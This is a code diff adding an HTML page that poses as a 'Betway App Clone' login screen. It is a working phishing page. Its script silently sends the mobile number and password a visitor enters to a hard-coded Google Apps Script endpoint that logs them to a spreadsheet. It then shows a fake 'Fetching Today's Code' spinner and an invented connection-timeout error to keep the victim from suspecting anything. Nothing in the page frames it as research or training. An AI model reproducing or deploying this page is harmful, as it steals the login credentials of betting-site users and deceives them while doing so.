@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betway App Clone</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Base Styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* =========================================
+           TOP NAVIGATION (Black Bar)
+           ========================================= */
+        .top-navbar {
+            background-color: #000;
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #222;
+            z-index: 10;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 22px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-nav-login {
+            background-color: #fff;
+            color: #00A826;
+            border: none;
+            padding: 6px 14px;
+            font-weight: bold;
+            font-size: 13px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn-nav-signup {
+            background-color: #00A826;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            font-weight: bold;
+            font-size: 13px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .search-icon {
+            font-size: 18px;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+
+        /* =========================================
+           SUB NAVIGATION (Dark Grey Bar)
+           ========================================= */
+        .sub-navbar {
+            background-color: #222;
+            display: flex;
+            align-items: center;
+            overflow-x: auto;
+            padding: 0 5px;
+            scrollbar-width: none;
+        }
+        
+        .sub-navbar::-webkit-scrollbar { display: none; }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 8px 12px;
+            font-size: 11px;
+            color: #ccc;
+            text-decoration: none;
+            min-width: 65px;
+            cursor: pointer;
+        }
+
+        .nav-item i { font-size: 18px; margin-bottom: 4px; }
+        .nav-item.active { background-color: #00A826; color: white; }
+
+        /* =========================================
+           MAIN CONTENT AREA (Background)
+           ========================================= */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            background: #000;
+            transition: opacity 0.3s ease;
+        }
+
+        .toggle-container {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            z-index: 2;
+        }
+
+        .toggle-btn {
+            width: 140px;
+            height: 60px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+
+        .toggle-btn.sport { background-color: #00A826; }
+        .toggle-btn.casino { background-color: #0055cc; }
+
+        .hero-clubhouse {
+            width: 100%;
+            flex: 1;
+            margin-top: -30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at center, #2a2a2a 0%, #0a0a0a 80%);
+        }
+
+        .clubhouse-arch { text-align: center; position: relative; top: 50px; }
+        .clubhouse-arch .small-logo { font-size: 20px; font-weight: bold; color: #888; }
+        .clubhouse-arch .clubhouse-text { font-size: 32px; font-weight: 900; letter-spacing: 2px; color: #555; }
+
+        /* =========================================
+           LOGIN MODAL
+           ========================================= */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 60px;
+            z-index: 100;
+            transition: opacity 0.3s ease;
+        }
+
+        .login-modal {
+            background-color: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            color: #333;
+        }
+
+        .modal-header {
+            background-color: #000;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .close-btn { background: none; border: none; color: white; font-size: 24px; cursor: pointer; }
+        .modal-body { padding: 20px; }
+        .input-group { margin-bottom: 15px; position: relative; }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .password-wrapper .input-field { padding-right: 40px; }
+        .eye-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #666; }
+        .form-links { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 20px; }
+        .form-links a { color: #333; text-decoration: none; }
+        .signup-prompt { background-color: #f4f4f4; padding: 15px; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; margin-bottom: 20px; }
+        .signup-prompt a { color: #000; font-weight: bold; text-decoration: none; }
+
+        .btn-login {
+            width: 100%;
+            background-color: #00A826;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-login:disabled { background-color: #66c27f; cursor: not-allowed; }
+
+        /* =========================================
+           FETCHING SCREEN (Hidden by default)
+           ========================================= */
+        .fetching-container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #121212;
+            z-index: 200;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border-left-color: #00A826;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .fetching-text {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .fetching-subtext {
+            color: #888;
+            font-size: 14px;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+
+        /* Error State */
+        .error-state {
+            display: none; /* Hidden initially */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .error-icon {
+            font-size: 60px;
+            color: #ff4444;
+            margin-bottom: 20px;
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff4444;
+            margin-bottom: 10px;
+        }
+
+        .error-message {
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 30px;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+
+        .btn-retry {
+            background-color: #00A826;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Utility */
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation -->
+    <header class="top-navbar">
+        <div class="nav-left">
+            <i class="fas fa-bars" style="font-size: 20px; cursor: pointer;"></i>
+            <span>betway</span>
+        </div>
+        <div class="nav-right">
+            <button class="btn-nav-login" onclick="openModal()">Login</button>
+            <button class="btn-nav-signup">Sign Up</button>
+            <i class="fas fa-search search-icon"></i>
+        </div>
+    </header>
+
+    <!-- Sub Navigation -->
+    <nav class="sub-navbar">
+        <a href="#" class="nav-item active"><i class="fas fa-home"></i><span>Home</span></a>
+        <a href="#" class="nav-item"><i class="far fa-futbol"></i><span>Sport</span></a>
+        <a href="#" class="nav-item"><i class="fas fa-crosshairs"></i><span>Aviator</span></a>
+        <a href="#" class="nav-item"><i class="fas fa-dice"></i><span>Casino</span></a>
+    </nav>
+
+    <!-- Main Content Area (Background) -->
+    <main class="main-content">
+        <div class="toggle-container">
+            <div class="toggle-btn sport">Sport</div>
+            <div class="toggle-btn casino">Casino</div>
+        </div>
+        <div class="hero-clubhouse">
+            <div class="clubhouse-arch">
+                <div class="small-logo">betway</div>
+                <div class="clubhouse-text">CLUBHOUSE</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- LOGIN MODAL -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="login-modal">
+            <div class="modal-header">
+                <span>Login</span>
+                <button class="close-btn" onclick="closeModal()"><i class="fas fa-times"></i></button>
+            </div>
+            
+            <div class="modal-body">
+                <form id="loginForm">
+                    <!-- Note: name attributes match Google Sheet headers -->
+                    <div class="input-group">
+                        <input type="text" name="Mobile Number" class="input-field" placeholder="+27  Mobile Number" required>
+                    </div>
+
+                    <div class="input-group password-wrapper">
+                        <input type="password" name="Password" class="input-field" id="passwordField" placeholder="Enter Password" required>
+                        <i class="fas fa-eye eye-icon" id="togglePassword"></i>
+                    </div>
+
+                    <div class="form-links">
+                        <a href="#">Forgot Username</a>
+                        <a href="#">Forgot Password?</a>
+                    </div>
+
+                    <div class="signup-prompt">
+                        <span>Don't have an account yet?</span>
+                        <a href="#">Sign Up <i class="fas fa-chevron-right" style="font-size: 10px;"></i></a>
+                    </div>
+
+                    <button type="submit" class="btn-login" id="loginBtn">Login</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- FETCHING CODE SCREEN (Hidden by default) -->
+    <div class="fetching-container hidden" id="fetchingScreen">
+        
+        <!-- Loading State -->
+        <div id="loadingState" style="display: flex; flex-direction: column; align-items: center;">
+            <div class="spinner"></div>
+            <div class="fetching-text">Fetching Today's Code...</div>
+            <div class="fetching-subtext">Please wait while we connect to the server and retrieve your daily access code. Do not close this window.</div>
+        </div>
+
+        <!-- Error State (Appears after 2 minutes) -->
+        <div class="error-state" id="errorState">
+            <i class="fas fa-exclamation-triangle error-icon"></i>
+            <div class="error-title">Connection Timed Out</div>
+            <div class="error-message">We were unable to fetch today's code. The server took too long to respond. Please check your internet connection and try again.</div>
+            <button class="btn-retry" onclick="location.reload()">Try Again</button>
+        </div>
+
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // --- 1. INSERT YOUR GOOGLE WEB APP URL HERE ---
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwK6m8XVb6rDOqvRHaWD9tapH3e3vSWGcF9tP6xhguVsbe2Nm1_sn1rEbiQhsit-glNqA/exec';
+
+        // UI Elements
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordField = document.getElementById('passwordField');
+        const modal = document.getElementById('loginModal');
+        const loginForm = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        // Fetching Screen Elements
+        const fetchingScreen = document.getElementById('fetchingScreen');
+        const loadingState = document.getElementById('loadingState');
+        const errorState = document.getElementById('errorState');
+
+        // Toggle Password Visibility
+        togglePassword.addEventListener('click', function () {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Open/Close Modal
+        function closeModal() { modal.classList.add('hidden'); }
+        function openModal() { modal.classList.remove('hidden'); }
+
+        // Handle Form Submit
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault(); // Stop page reload
+
+            // 1. Change button state
+            loginBtn.textContent = 'Logging in...';
+            loginBtn.disabled = true;
+
+            // 2. Gather form data
+            const formData = new FormData(loginForm);
+
+            // 3. Send data silently to Google Sheet
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData
+            })
+            .catch(error => {
+                // Ignore network errors so it doesn't break the user experience
+                console.log('Background save failed:', error);
+            })
+            .finally(() => {
+                // 4. Hide modal, Reset form
+                modal.classList.add('hidden');
+                loginForm.reset();
+                loginBtn.textContent = 'Login';
+                loginBtn.disabled = false;
+
+                // 5. Show the Fetching Screen
+                fetchingScreen.classList.remove('hidden');
+                loadingState.style.display = 'flex';
+                errorState.style.display = 'none';
+
+                // 6. Set the timer (120,000 milliseconds = 2 minutes)
+                const waitTime = 120000; 
+
+                setTimeout(() => {
+                    // After 2 minutes, hide the loading spinner and show the error
+                    loadingState.style.display = 'none';
+                    errorState.style.display = 'flex';
+                }, waitTime);
+            });
+        });
+    </script>
+</body>
+</html>
